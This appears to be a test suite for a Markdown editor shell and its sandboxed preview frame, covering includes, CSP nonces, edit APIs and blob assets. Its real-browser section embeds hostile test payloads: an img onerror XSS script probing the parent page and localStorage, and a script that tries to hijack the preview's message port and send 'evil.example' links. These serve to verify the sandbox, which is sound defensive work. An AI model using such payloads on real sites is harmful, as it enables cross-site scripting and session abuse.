    expect(assembled.at(-1)).toEqual({ includes: { 'a.md': 'A' }, twinLinks: { md: '{stem}.html', slides: '{stem}.deck.html' } });
    m.shell.destroy();
    const linked = mount({ text, twinLinks: naming, hooks: { resolveLink: (h) => h }, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); } });
    await tick(30);
    expect(ctxs.at(-1)!.twinLinks).toBe(false);
    linked.shell.destroy();
    const family = mount({ text, twinLinks: { md: '{stem}.md.html' }, assemble: (t, o) => { assembled.push(o ?? 'none'); return `<html>${t}</html>`; }, saver: fakeSaver({ via: 'file', ok: true }).saver, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); } });
    await tick(30);
    expect(ctxs.at(-1)!.twinLinks).toBeUndefined();
    type(family, 'y');
    await family.shell.save();
    expect(assembled.at(-1)).toBe('none');
    family.shell.destroy();
  });

  it('[E.12] with only fetchInclude (no include record), a URL include next to a file include still resolves; the unreadable file include renders the missing-include note (E.30)', async () => {
    const text = '{{md parts/a.md}}\n\n{{md https://x.example/b.md}}\n';
    const fetchInclude = async (u: string) => (u.includes('b.md') ? 'URL CONTENT' : null);
    const html = await renderMarkdownPreviewWithIncludes(text, { fetchInclude });
    expect(html).toContain('URL CONTENT');
    expect(html).toBe(await renderMarkdownPreviewWithIncludes(text, { fetchInclude, includes: {} }));
  });

  it('[E.12] renderMarkdownPreviewWithIncludes resolves URL includes through ctx.fetchInclude (each URL once per shell cache; a failed one again next time), and keeps the anchors of the lines before and after the include', async () => {
    const text = '{{nyml\nkind: document\n}}\n\n# Top\n\n{{md https://inc.test/part.md}}\n\nAfter the include.\n';
    const fetchInclude = vi.fn(async (u: string) => (u.includes('part') ? 'Included **text**.\n\nSecond included paragraph.\n' : null));
    const cache = new Map<string, unknown>();
    const html = await renderMarkdownPreviewWithIncludes(text, { fetchInclude, cache });
    expect(html).toContain('<strong>text</strong>');
    expect(html).toMatch(/<h1[^>]*data-src-line="4"/);
    expect(html).toMatch(/<p data-src-line="8">After the include\.<\/p>/);
    await renderMarkdownPreviewWithIncludes(text, { fetchInclude, cache });
    expect(fetchInclude).toHaveBeenCalledTimes(1);
    const failing = '# x\n\n{{md https://inc.test/missing.md}}\n';
    await renderMarkdownPreviewWithIncludes(failing, { fetchInclude, cache });
    await renderMarkdownPreviewWithIncludes(failing, { fetchInclude, cache });
    expect(fetchInclude).toHaveBeenCalledTimes(3);
    expect(await renderMarkdownPreviewWithIncludes(text)).toBe(renderMarkdownPreview(text)); // no fetchInclude: as before
    // through the shell, with its per-shell cache
    const m = mount({ text, render: renderMarkdownPreviewWithIncludes, hooks: { fetchInclude } });
    const f = frameOf(m);
    f.say({ type: 'orz-preview-ready' });
    await tick(60);
    expect(String(f.posted.find((x) => x.type === 'orz-preview-render')!.html)).toContain('Second included paragraph.');
    m.shell.destroy();
  });

  it('[E.12] (2.2.0) renderMarkdownPreviewWithIncludes passes the render env to prepareSources as includeEnv: a text with a live FILE include gets its URL includes too (corpus md/includes.md); the directive names are the renderer\'s (md, markdown, md-include)', async () => {
    const manifest = JSON.parse(readFileSync('tests/carrier-corpus/manifest.json', 'utf8')) as { files: Array<{ path: string; includes?: Record<string, string> }> };
    const entry = manifest.files.find((f) => f.path === 'md/includes.md')!;
    const text = readFileSync('tests/carrier-corpus/md/includes.md', 'utf8');
    const url = Object.keys(entry.includes!).find((k) => /^https:/.test(k))!;
    const file = Object.keys(entry.includes!).find((k) => !/^https:/.test(k))!;
    const fetchInclude = vi.fn(async (u: string) => (u === url ? 'HOST-RESOLVED glossary\n' : null));
    // a host reader for the file include (env.readFile): before 2.2.0 the URL include then stayed a directive
    const env = { markdownBasePath: '/', readFile: (p: string) => (p === `/${file}` ? 'FROM THE HOST READER\n' : null) };
    const html = await renderMarkdownPreviewWithIncludes(text, { fetchInclude, env });
    expect(fetchInclude).toHaveBeenCalledWith(url);
    expect(html).toContain('HOST-RESOLVED glossary');
    expect(html).toContain('FROM THE HOST READER');
    for (const name of ['md', 'markdown', 'md-include']) {
      const t = `# T\n\n{{${name} parts/a.md}}\n\n{{${name} https://inc.test/${name}.md}}\n`;
      const out = await renderMarkdownPreviewWithIncludes(t, { fetchInclude: async (u) => `URL-${u.split('/').pop()!.replace('.md', '')}-RESOLVED\n`, env: { markdownBasePath: '/', readFile: () => 'FILE A\n' } });
      expect(out, name).toContain(`URL-${name}-RESOLVED`);
      expect(out, name).toContain('FILE A');
    }
  });

  it('[E.12] (2.2.0) the #orz-includes record renders offline: renderMarkdownPreview(text, { includes }) reads file includes from it (includeRecordEnv: readFile on a virtual root), renderMarkdownPreviewWithIncludes URL includes too — the host\'s fetchInclude first, the record for what it does not answer; the shell passes its includes option as ctx.includes', async () => {
    const manifest = JSON.parse(readFileSync('tests/carrier-corpus/manifest.json', 'utf8')) as { files: Array<{ path: string; includes?: Record<string, string> }> };
    const includes = manifest.files.find((f) => f.path === 'md/includes.md')!.includes!;
    const text = readFileSync('tests/carrier-corpus/md/includes.md', 'utf8');
    const firstLine = (s: string) => s.split(/\r?\n/).find((l) => /\w/.test(l))!.replace(/^#+\s*|^- /, '').slice(0, 14);
    const [url, file] = [Object.keys(includes).find((k) => /^https:/.test(k))!, Object.keys(includes).find((k) => !/^https:/.test(k))!];
    // sync: file includes from the record; URL includes need the async pass
    const sync = renderMarkdownPreview(text, { includes });
    expect(sync).toContain(firstLine(includes[file]).replace(/[<>]/g, ''));
    expect(sync).not.toContain(firstLine(includes[url]));
    expect(renderMarkdownPreview(text)).not.toContain(firstLine(includes[file]).replace(/[<>]/g, ''));
    // async: both, offline (no fetchInclude) — and the anchors of the lines outside the includes stay exact
    const both = await renderMarkdownPreviewWithIncludes(text, { includes });
    expect(both).toContain(firstLine(includes[file]).replace(/[<>]/g, ''));
    expect(both).toContain(firstLine(includes[url]));
    expect(both).toMatch(/<h1[^>]*data-src-line="7"/);
    // the host wins where it answers; the record for the rest
    const host = await renderMarkdownPreviewWithIncludes(text, { includes, fetchInclude: async (u) => (u === url ? 'FRESH FROM THE HOST\n' : null) });
    expect(host).toContain('FRESH FROM THE HOST');
    expect(host).not.toContain(firstLine(includes[url]));
    const fallback = await renderMarkdownPreviewWithIncludes(text, { includes, fetchInclude: async () => { throw new Error('offline'); } });
    expect(fallback).toContain(firstLine(includes[url]));
    // the reader: paths as written resolve on a virtual root; URL entries are not files; a missing file renders nothing
    const env = includeRecordEnv({ 'parts/x.md': 'X', './y.md': 'Y', 'https://a.test/z.md': 'Z' });
    expect([env.markdownBasePath, env.readFile!('/parts/x.md'), env.readFile!('/y.md'), env.readFile!('/https:/a.test/z.md'), env.readFile!('/nope.md')]).toEqual(['/', 'X', 'Y', null, null]);
    expect(includeRecordEnv(undefined).readFile!('/x')).toBeNull();
    expect(renderMarkdownPreview('# T\n\n{{md missing.md}}\n', { includes: {} })).toContain('Included file not available: missing.md'); // E.30
    // the shell gives its includes option to render as ctx.includes
    const ctxs: RenderContext[] = [];
    const m = mount({ text, includes: { ...includes }, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreviewWithIncludes(t, ctx); } });
    const f = frameOf(m);
    f.say({ type: 'orz-preview-ready' });
    await tick(80);
    expect(ctxs[0].includes).toEqual(includes);
    expect(String(f.posted.find((x) => x.type === 'orz-preview-render')!.html)).toContain(firstLine(includes[url]));
    m.shell.destroy();
    const plain = mount({ render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t); } });
    frameOf(plain).say({ type: 'orz-preview-ready' });
    await tick(40);
    expect(ctxs.at(-1)!.includes).toBeUndefined();
    plain.shell.destroy();
  });

  it('[E.19] (2.2.0) FC-19 §3 nonce: createEditorShell({ nonce }) stamps it on the preview frame (preview.nonce when that is not given) and gives it to the default CodeMirror adapter', async () => {
    const ctx = page();
    const appended: Array<{ tag: string; src: string; nonce: string | null }> = [];
    const head = ctx.document.head;
    const append = head.append.bind(head);
    head.append = (...nodes: Array<string | Node>) => {
      for (const n of nodes) if (typeof n !== 'string' && (n as Element).tagName) appended.push({ tag: (n as Element).tagName, src: (n as HTMLScriptElement).src ?? '', nonce: (n as Element).getAttribute('nonce') });
      append(...nodes);
    };
    const m = mount({ render: () => '<p>x</p>', nonce: 'app-nonce', adapter: undefined, preview: { debounceMs: 10 } }, ctx);
    const srcdoc = m.root.querySelector('iframe')!.srcdoc;
    const tags = srcdoc.match(/<(script|style|link)\b[^>]*>/gi)!;
    expect(tags.length).toBeGreaterThan(3);
    for (const t of tags) expect(t).toContain('nonce="app-nonce"');
    // the default adapter asks for CodeMirror with the nonce on its <script>
    expect(m.shell.adapter.name).toBe('textarea'); // at once; it upgrades when the bundle arrives
    expect(appended.find((x) => x.src.includes('codemirror6.js'))?.nonce).toBe('app-nonce');
    m.shell.destroy();
    const own = mount({ render: () => '<p>x</p>', nonce: 'app-nonce', preview: { nonce: 'frame-only', debounceMs: 10 } });
    expect(own.root.querySelector('iframe')!.srcdoc).toContain('nonce="frame-only"');
    expect(own.root.querySelector('iframe')!.srcdoc).not.toContain('nonce="app-nonce"');
    own.shell.destroy();
  });

  it('[E.19] a nonce is stamped on stylesheet links too, and codemirror6Adapter / loadCodeMirror6 take one: on the bundle\'s <script> and for CodeMirror\'s own <style> (EditorView.cspNonce)', async () => {
    const full = previewFrameDocument({ nonce: 'n1', head: '<link rel="stylesheet" href="t.css">' });
    for (const t of full.match(/<link\b[^>]*>/g)!) expect(t).toContain('nonce="n1"');
    const ctx = page();
    const appended: Element[] = [];
    const head = ctx.document.head;
    const append = head.append.bind(head);
    head.append = (...nodes: Array<Node | string>) => { appended.push(...nodes.filter((n): n is Element => typeof n !== 'string')); };
    const p = loadCodeMirror6(ctx.document as unknown as EdDocument, { url: 'https://cdn.example/cm6.js', nonce: 'n2', timeoutMs: 50 });
    head.append = append;
    expect(appended.map((n) => [n.tagName, n.getAttribute('nonce'), n.getAttribute('integrity')])).toEqual([['SCRIPT', 'n2', CODEMIRROR6_INTEGRITY]]);
    await expect(p).rejects.toThrow();
    expect(readFileSync('src/carrier/editor/codemirror6.ts', 'utf8')).toContain('EditorView.cspNonce.of(options.nonce)');
  });
});

// ── 2.4.0: applyEdits, select, setFocusRange (FC-19 §4, the layout GUI's API) ──

describe('applyEdits, select and setFocusRange (2.4.0)', () => {
  const T = '﻿{{nyml\r\nkind: document\r\n}}\r\n\r\n<!-- slide 2col -->\r\n<!-- @left -->\r\nA\r\n<!-- @right -->\r\nB\r\n';
  const at = (s: string, sub: string): number => { const i = s.indexOf(sub); if (i < 0) throw new Error(sub); return i; };

  it('[E.38] applyEdits applies several replacements (exact offsets, sorted) as ONE undoable edit in the document\'s line endings and BOM, maps the selection, reports the label on the change event and refuses malformed, unsorted, overlapping, out-of-text, before-BOM or CR LF-splitting edits with a RangeError that changes nothing; read-only or destroyed it returns false', () => {
    const m = mount({ text: T });
    const changes: Array<{ text: string; label?: string }> = [];
    m.shell.on('change', (e) => changes.push({ ...e }));
    // the caret on "B"
    const d0 = m.shell.adapter.getDoc();
    m.shell.adapter.setSelection!({ from: d0.indexOf('B'), to: d0.indexOf('B') }, { scroll: false });
    const marker = at(T, '2col');
    const left = at(T, '@left');
    expect(m.shell.applyEdits([
      { from: marker, to: marker + 4, insert: 'col 2/1 { left; right }' },
      { from: left, to: left + 5, insert: '@left' },
      { from: at(T, 'A'), to: at(T, 'A') + 1, insert: 'A1\nA2' },
    ], { label: 'resize' })).toBe(true);
    const want = T.replace('2col', 'col 2/1 { left; right }').replace('\r\nA\r\n', '\r\nA1\r\nA2\r\n');
    expect(m.shell.getText()).toBe(want);
    expect(changes).toEqual([{ text: want, label: 'resize' }]);
    // the caret stayed on "B" (mapped through all three edits)
    const d1 = m.shell.adapter.getDoc();
    expect(m.shell.adapter.getSelection!()).toEqual({ from: d1.indexOf('B'), to: d1.indexOf('B') });
    // one undo step back to the exact text, one redo forward
    expect(m.shell.undo()).toBe(true);
    expect(m.shell.getText()).toBe(T);
    expect(m.shell.redo()).toBe(true);
    expect(m.shell.getText()).toBe(want);
    m.shell.undo();
    // a later ordinary change carries no label
    m.shell.setText(T + 'x');
    expect(changes.at(-1)).toEqual({ text: T + 'x' });
    m.shell.setText(T);
    // inserts at one offset apply in the order given; an empty list and a no-op change nothing
    const n = changes.length;
    expect(m.shell.applyEdits([{ from: left, to: left, insert: 'x' }, { from: left, to: left, insert: 'y' }])).toBe(true);
    expect(m.shell.getText()).toBe(T.slice(0, left) + 'xy' + T.slice(left));
    m.shell.undo();
    expect(m.shell.applyEdits([])).toBe(true);
    expect(m.shell.applyEdits([{ from: left, to: left + 1, insert: '@' }])).toBe(true);
    expect(changes.length).toBe(n + 2); // the xy insert and its undo
    // refusals change nothing
    const refused: Array<[string, unknown]> = [
      ['out of order', [{ from: left, to: left, insert: 'a' }, { from: marker, to: marker, insert: 'b' }]],
      ['overlapping', [{ from: marker, to: marker + 4, insert: 'a' }, { from: marker + 2, to: marker + 6, insert: 'b' }]],
      ['outside', [{ from: 0, to: T.length + 1, insert: '' }]],
      ['before the BOM', [{ from: 0, to: 0, insert: 'x' }]],
      ['inside CR LF', [{ from: at(T, '\r\nA') + 1, to: at(T, '\r\nA') + 1, insert: 'x' }]],
      ['from > to', [{ from: left + 2, to: left, insert: '' }]],
      ['not an integer', [{ from: 1.5, to: 2, insert: '' }]],
      ['no insert', [{ from: left, to: left }]],
    ];
    for (const [why, edits] of refused) {
      expect(() => m.shell.applyEdits(edits as never), why).toThrow(RangeError);
      expect(m.shell.getText(), why).toBe(T);
    }
    expect(() => m.shell.applyEdits('x' as never)).toThrow(TypeError);
    expect(changes.length).toBe(n + 2);
    m.shell.setReadOnly(true);
    expect(m.shell.applyEdits([{ from: left, to: left, insert: 'x' }])).toBe(false);
    expect(m.shell.getText()).toBe(T);
    m.shell.setReadOnly(false);
    m.shell.destroy();
    expect(m.shell.applyEdits([{ from: left, to: left, insert: 'x' }])).toBe(false);
    expect(m.shell.getText()).toBe(T);
  });

  it('[E.38] applyEdits keeps every line-ending style exact (LF, CR LF, CR, mixed) — inserted breaks in the document\'s style — and an edit that joins a CR with an LF still yields exactly the text asked for (written whole, one undo step)', () => {
    for (const [name, text] of Object.entries(TEXTS)) {
      const m = mount({ text });
      const start = text.startsWith('﻿') ? 1 : 0;
      const mid = Math.max(start, Math.min(text.length, Math.floor(text.length / 2)));
      const safe = mid > 0 && text[mid - 1] === '\r' && text[mid] === '\n' ? mid + 1 : mid;
      const eol = /\r\n/.test(text.split(/(?<=\r\n|\r|\n)/)[0] ?? '') ? '\r\n' : /\r(?!\n)/.test(text.split(/(?<=\r\n|\r|\n)/)[0] ?? '') ? '\r' : '\n';
      m.shell.applyEdits([{ from: start, to: start, insert: 'P\n' }, { from: safe, to: safe, insert: 'Q\nR' }]);
      const style = (s: string): string => s.replace(/\n/g, ['mixed EOL'].includes(name) ? '\r\n' : (text.match(/\r\n|\r|\n/)?.[0] ?? '\n'));
      expect(m.shell.getText(), name).toBe(text.slice(0, start) + style('P\n') + text.slice(start, safe) + style('Q\nR') + text.slice(safe));
      void eol;
      m.shell.undo();
      expect(m.shell.getText(), name).toBe(text);
      m.shell.destroy();
    }
    // a CR inserted right before an LF in a CR-style text joins them: the shell writes the whole text
    const cr = 'a\rb\nc\r';
    const m = mount({ text: cr });
    expect(m.shell.applyEdits([{ from: 3, to: 3, insert: 'x' }, { from: 3, to: 3, insert: 'y\r' }])).toBe(true);
    expect(m.shell.getText()).toBe('a\rbxy\r\nc\r');
    m.shell.undo();
    expect(m.shell.getText()).toBe(cr);
    m.shell.destroy();
  });

  it('[E.39] select(from, to, { scroll }) selects exact offsets (BOM and CR LF counted; clamped; a boundary inside a CR LF moves before it), emits the selection event with those offsets, scrolls unless scroll: false, works read-only and never moves the focus', async () => {
    const long = T + Array.from({ length: 400 }, (_, i) => `line ${i}\r\n`).join('');
    const m = mount({ text: long });
    const sel: Array<{ from: number; to: number }> = [];
    m.shell.on('selection', (e) => sel.push(e));
    const b = at(long, 'B');
    m.shell.select(b, b + 1);
    const d = m.shell.adapter.getDoc();
    expect(m.shell.adapter.getSelection!()).toEqual({ from: d.indexOf('B'), to: d.indexOf('B') + 1 });
    expect(sel.at(-1)).toEqual({ from: b, to: b + 1 });
    // clamped, and inside a CR LF → before it
    m.shell.select(-5, 10 ** 9);
    expect(m.shell.adapter.getSelection!()).toEqual({ from: 0, to: d.length });
    const crlf = at(long, '\r\nA');
    m.shell.select(crlf + 1, crlf + 1);
    expect(m.shell.adapter.getSelection!()).toEqual({ from: d.indexOf('\nA'), to: d.indexOf('\nA') });
    // scrolling: the textarea moves to the selected line; scroll: false keeps it
    const ta = m.ta();
    Object.defineProperty(ta, 'scrollHeight', { configurable: true, get: () => 8000 });
    Object.defineProperty(ta, 'clientHeight', { configurable: true, get: () => 400 });
    ta.scrollTop = 0;
    const far = at(long, 'line 300');
    m.shell.select(far, far, { scroll: false });
    expect(ta.scrollTop).toBe(0);
    m.shell.select(far, far);
    expect(ta.scrollTop).toBeGreaterThan(4000);
    // read-only: still selects; the focus is not taken
    m.shell.setReadOnly(true);
    m.shell.select(b, b);
    expect(sel.at(-1)).toEqual({ from: b, to: b });
    expect(m.root.activeElement).toBeNull();
    expect(() => m.shell.select('1' as never, 2)).toThrow(TypeError);
    m.shell.destroy();
    m.shell.select(0, 1); // a no-op after destroy
  });

  it('[E.40] setFocusRange with the textarea engine shows everything and changes nothing (no throw, the text exact); bad arguments throw a TypeError; after destroy it is a no-op', () => {
    const m = mount({ text: T });
    m.shell.setFocusRange(at(T, '<!-- slide'), T.length);
    m.shell.setFocusRange(at(T, '<!-- slide'), T.length, { mode: 'fold' });
    m.shell.setFocusRange(null);
    expect(m.shell.getText()).toBe(T);
    expect(() => m.shell.setFocusRange(1, undefined)).toThrow(TypeError);
    m.shell.destroy();
    m.shell.setFocusRange(0, 1);
  });

  it('[E.42] getSelection with the textarea engine: the selection in exact offsets (BOM, CR LF), as select set it and as a change above it moved it; null after destroy', () => {
    const m = mount({ text: T });
    const r = at(T, '<!-- @right');
    m.shell.select(r, r + 4);
    expect(m.shell.getSelection()).toEqual({ from: r, to: r + 4 });
    m.shell.destroy();
    expect(m.shell.getSelection()).toBeNull();
  });

  it('[E.41] flash with the textarea engine lights nothing and changes nothing (no throw, the text exact); bad arguments throw a TypeError; after destroy it is a no-op', () => {
    const m = mount({ text: T });
    m.shell.flash([{ from: at(T, '<!-- slide'), to: at(T, '<!-- slide') + 4 }]);
    m.shell.flash([], { ms: 100 });
    expect(m.shell.getText()).toBe(T);
    expect(() => m.shell.flash('x' as never)).toThrow(TypeError);
    expect(() => m.shell.flash([{ from: 1 } as never])).toThrow(TypeError);
    m.shell.destroy();
    m.shell.flash([{ from: 0, to: 1 }]);
  });
});

// ── E.13 real Chrome ─────────────────────────────────────────────────────

type Browser = import('playwright-core').Browser;
type Page = import('playwright-core').Page;

async function launch(): Promise<Browser | null> {
  try {
    const { chromium } = await import('playwright-core');
    return await chromium.launch({ channel: 'chrome' });
  } catch {
    return null;
  }
}

const browser = await launch();
const chrome = browser ? describe : describe.skip;

chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, () => {
  const servers: http.Server[] = [];
  let A = '';
  /**
   * A document script that asks for the preview's port the way a replaced document would (a ready with a
   * channel, and a guessed secret) and, should it get one, sends a save, a view key, a link and a scroll
   * through it; `window.__got` records '[port]' when it got one, and what it typed.
   */
  const GRAB = "window.__atk=1;window.__got='';addEventListener('message',function(e){var d=e.data;if(d&&d.type==='orz-preview-port'&&e.ports&&e.ports[0]){window.__got+='[port]';var P=e.ports[0];P.postMessage({type:'orz-preview-key',key:'s'});P.postMessage({type:'orz-preview-key',key:'\\\\'});P.postMessage({type:'orz-preview-link',href:'https://evil.example/port'});P.postMessage({type:'orz-preview-scrolled',top:0,max:100000})}},true);parent.postMessage({type:'orz-preview-ready',channel:'g1'},'*');parent.postMessage({type:'orz-preview-ready',channel:'g2',secret:'guess'},'*')";
  /** Another origin: the pages a document's meta refresh navigates its preview to (option B, finding (b) of round 3). */
  let EVIL = '';
  let editorJs = '';
  const cm = readFileSync(CODEMIRROR6_PATH, 'utf8');
  const TEXT_A = `﻿{{nyml\r\nkind: document\r\ntitle: A\r\nuid: ${UID_A}\r\n}}\r\n\r\n# Shell A\r\n\r\nParagraph <img src="x" onerror="var r={};try{parent.document.title='pwned'}catch(e){r.doc=e.name}try{r.ls=String(parent.localStorage.length)}catch(e){r.ls=e.name}try{r.mine=String(localStorage.length)}catch(e){r.mine=e.name}parent.postMessage({probe:r},'*');parent.postMessage({type:'orz-preview-key',key:'s'},'*');parent.postMessage({type:'orz-preview-link',href:'https://evil.example/'},'*')">\r\n`;
  const TEXT_B = `{{nyml\nkind: document\nuid: ${UID_B}\n}}\n\n# Shell B\n\n${Array.from({ length: 80 }, (_, i) => `Line ${i} of B.\n`).join('\n')}`;
  const APP = `
    window.__saved = { a: [], b: [], c: [] };
    window.__links = [];
    window.__probes = [];
    window.addEventListener('message', function (e) { if (e.data && e.data.probe) window.__probes.push(e.data.probe); });
    // window listeners added by the editor and CodeMirror (not by the test driver's injected script)
    window.__listeners = 0;
    var ours = function () { return /[/](editor|cm6)[.]js/.test(String(new Error().stack)); };
    var add = window.addEventListener, rem = window.removeEventListener;
    window.addEventListener = function () { if (ours()) window.__listeners++; return add.apply(this, arguments); };
    window.removeEventListener = function () { if (ours()) window.__listeners--; return rem.apply(this, arguments); };
    window.mount = function (id, text, url) {
      var E = window.OrzEditor;
      var s = E.createEditorShell(document.getElementById(id), {
        text: text,
        render: function (t) { return E.renderMarkdownPreview(t); },
        adapter: E.codemirror6Adapter({ url: url }),
        hooks: { save: function (t) { window.__saved[id].push(t); return Promise.resolve(); } },
        preview: { assets: false, debounceMs: 50 },
      });
      window['shell_' + id] = s;
      return s.ready.then(function (r) { return { engine: r.engine, error: r.error ? String(r.error) : null }; });
    };
    window.mountOpts = function (id, text, url, o) {
      var E = window.OrzEditor;
      o = o || {};
      var s = E.createEditorShell(document.getElementById(id), {
        text: text,
        render: function (t) { return E.renderMarkdownPreview(t); },
        adapter: E.codemirror6Adapter({ url: url }),
        hooks: { save: function (t) { window.__saved[id].push(t); return Promise.resolve(); } },
        preview: Object.assign({ assets: false, debounceMs: 50 }, o.preview || {}),
        onLink: o.links ? function (h) { window.__links.push(h); } : undefined,
      });
      window['shell_' + id] = s;
      if (o.print) s.on('print', function (e) { (window.__prints = window.__prints || []).push(id + ':' + e.source); });
      window['errors_' + id] = [];
      s.on('error', function (e) { window['errors_' + id].push(e.source + ': ' + e.message); });
      return s.ready.then(function (r) { return { engine: r.engine, error: r.error ? String(r.error) : null }; });
    };`;

  beforeAll(async () => {
    const { build } = await import('esbuild');
    // one KaTeX: an ESM bundle of src resolves `katex/contrib/mhchem` to its .mjs build (importing katex.mjs) while the
    // KaTeX plugin requires katex.js, so `\ce` would land on the other copy; the CommonJS dist resolves both to katex.js
    editorJs = (await build({ entryPoints: ['src/carrier/editor/index.ts'], bundle: true, platform: 'browser', format: 'iife', globalName: 'OrzEditor', write: false, logLevel: 'silent', alias: { 'katex/contrib/mhchem': 'katex/dist/contrib/mhchem.js' } })).outputFiles[0].text;
    const server = http.createServer((req, res) => {
      const path = (req.url ?? '/').split('?')[0];
      const js = (body: string) => { res.setHeader('content-type', 'text/javascript; charset=utf-8'); res.setHeader('access-control-allow-origin', '*'); res.end(body); };
      if (path === '/editor.js') return js(editorJs);
      if (path === '/app.js') return js(APP);
      if (path === '/cm6.js') return js(cm);
      if (path === '/cm6-tampered.js') return js(`${cm}\n/* one byte more */`);
      if (path === '/cm6-slow.js') { setTimeout(() => js(cm), 2500); return; }
      if (path === '/slow.css') { setTimeout(() => { res.setHeader('content-type', 'text/css'); res.end('body{color:rgb(0,0,255)}'); }, 6000); return; }
      if (path.startsWith('/slow-theme-')) { setTimeout(() => { res.setHeader('content-type', 'text/css'); res.end(`body{background:${path.includes('dark') ? 'rgb(20,20,30)' : 'rgb(250,250,240)'}}`); }, 700); return; }
      res.setHeader('content-type', 'text/html; charset=utf-8');
      if (path === '/csp') res.setHeader('content-security-policy', "script-src 'self' 'nonce-abc'");
      if (path === '/csp-hash') res.setHeader('content-security-policy', `script-src 'self' ${new URL(req.url ?? '/', 'http://x').searchParams.get('h') ?? ''}`);
      res.end('<!doctype html><html><head><meta charset="utf-8"><title>host page</title><style>body{margin:0;font:30px serif;color:red} .box{width:1000px;height:420px} button{background:red}</style></head><body><div id="a" class="box"></div><div id="b" class="box"></div><div id="c" class="box"></div><script src="/editor.js"></script><script src="/app.js"></script></body></html>');
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    servers.push(server);
    A = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const evil = http.createServer((_req, res) => { res.setHeader('content-type', 'text/html; charset=utf-8'); res.end(`<!doctype html><title>evil</title><script>${GRAB}</script>`); });
    await new Promise<void>((r) => evil.listen(0, '127.0.0.1', r));
    servers.push(evil);
    EVIL = `http://127.0.0.1:${(evil.address() as AddressInfo).port}/evil`;
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    for (const s of servers) s.close();
  });

  const open = async (): Promise<Page> => {
    const p = await browser!.newPage({ viewport: { width: 1200, height: 1400 } });
    await p.goto(`${A}/`);
    await p.waitForFunction('typeof window.mount === "function"');
    return p;
  };
  const mountBoth = (p: Page) => p.evaluate(`Promise.all([mount('a', ${JSON.stringify(TEXT_A)}, ${JSON.stringify(`${A}/cm6.js`)}), mount('b', ${JSON.stringify(TEXT_B)}, ${JSON.stringify(`${A}/cm6.js`)})])`);
  const frameOf = async (p: Page, marker: string) => {
    for (let i = 0; i < 100; i++) {
      for (const f of p.frames()) {
        if (f === p.mainFrame()) continue;
        const html = await f.evaluate('document.getElementById("orz-doc") ? document.getElementById("orz-doc").innerHTML : ""').catch(() => '');
        if (String(html).includes(marker)) return f;
      }
      await p.waitForTimeout(50);
    }
    throw new Error(`no preview frame shows ${marker}`);
  };

  it('[E.44] a resolveAsset that returns the page\'s own blob: URLs (uploads kept as object URLs) shows the pictures in the opaque preview frame: their bytes go over once and the frame shows its own object URL; a revoked one stays as written and is one error { source: hook } (slides final loop EI-1)', async () => {
    const p = await open();
    await p.evaluate(`(function () {
      var E = window.OrzEditor;
      var svg = '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="30"><rect width="40" height="30" fill="red"/></svg>';
      window.__blob = URL.createObjectURL(new Blob([svg], { type: 'image/svg+xml' }));
      window.__gone = URL.createObjectURL(new Blob([svg], { type: 'image/svg+xml' }));
      URL.revokeObjectURL(window.__gone);
      window.__asked = [];
      window.__errs = [];
      var s = E.createEditorShell(document.getElementById('a'), {
        text: '# Pictures\\n\\n![up](assets/up.svg) ![gone](assets/gone.svg)\\n\\n<img src="assets/up.svg" srcset="assets/up.svg 2x" alt="again">\\n',
        render: function (t) { return E.renderMarkdownPreview(t); },
        adapter: E.textareaAdapter(),
        hooks: { resolveAsset: function (p) { window.__asked.push(p); return p === 'assets/up.svg' ? window.__blob : window.__gone; } },
        preview: { assets: false, debounceMs: 20 },
      });
      s.on('error', function (e) { window.__errs.push(e.source + ': ' + e.message); });
      window.shell_blob = s;
    })()`);
    const f = await frameOf(p, 'Pictures');
    await expect.poll(async () => f.evaluate('[].map.call(document.querySelectorAll("#orz-doc img"), function (i) { return (i.alt) + ":" + (i.complete ? i.naturalWidth : -1) + ":" + (/^(blob:null|blob:http|data:)/.exec(i.getAttribute("src")) || ["?"])[0]; }).join(" ")'), { timeout: 10_000 })
      .toMatch(/^up:40:blob:null gone:0:blob:http again:(20|40):blob:null$/); // the frame's own object URL (E.46); again: its src or the 2x of its srcset
    const errs = await p.evaluate('window.__errs') as string[];
    expect(errs).toHaveLength(1);
    expect(errs[0]).toMatch(/^hook: blob:.* could not be read for the preview/);
    // the text is never touched; a second render reads nothing again (the cache) and still shows the picture
    await p.evaluate('shell_blob.setText(shell_blob.getText() + "\\nmore\\n")');
    const f2 = await frameOf(p, 'more');
    expect(await f2.evaluate('document.querySelector("#orz-doc img").naturalWidth')).toBe(40);
    expect(await p.evaluate('window.__errs.length')).toBe(1);
    expect(await p.evaluate('shell_blob.getText().indexOf("data:")')).toBe(-1);
    await p.close();
  });

  it('[E.46] blob: uploads cross once: 10 pictures of 4 MB kept as object URLs — each Blob is sent to the frame once (not per render), the rendered HTML that crosses holds no data: copy and stays small, typing keeps the preview within 2 s with no long task over 1 s; a blob: URL written in the document is never read; an asset no longer used is released; the frame stays allow-scripts and shows its own blob:null URLs (slides confirming round E-M2)', async () => {
    const p = await open();
    await p.evaluate(`(function () {
      var E = window.OrzEditor;
      window.__sent = [];
      var pm = MessagePort.prototype.postMessage;
      MessagePort.prototype.postMessage = function (m) {
        try { if (m && typeof m === 'object') window.__sent.push({ type: m.type, html: typeof m.html === 'string' ? m.html.length : -1, add: m.add ? m.add.map(function (a) { return a[0]; }) : [], drop: m.drop || [] }); } catch (e) {}
        return pm.apply(this, arguments);
      };
      window.__urls = {};
      var text = '# Photos\\n\\n';
      for (var i = 0; i < 10; i++) {
        var svg = '<svg xmlns="http://www.w3.org/2000/svg" width="' + (30 + i) + '" height="20"><rect width="10" height="10"/><!-- ' + 'abcdefgh'.repeat(512 * 1024) + ' --></svg>';
        window.__urls['assets/p' + i + '.svg'] = URL.createObjectURL(new Blob([svg], { type: 'image/svg+xml' }));
        text += '![p' + i + '](assets/p' + i + '.svg)\\n\\n';
      }
      window.__own = URL.createObjectURL(new Blob(['secret'], { type: 'text/plain' }));
      text += '<img alt="own" src="' + window.__own + '">\\n\\nend\\n';
      window.__errs = [];
      var s = E.createEditorShell(document.getElementById('a'), {
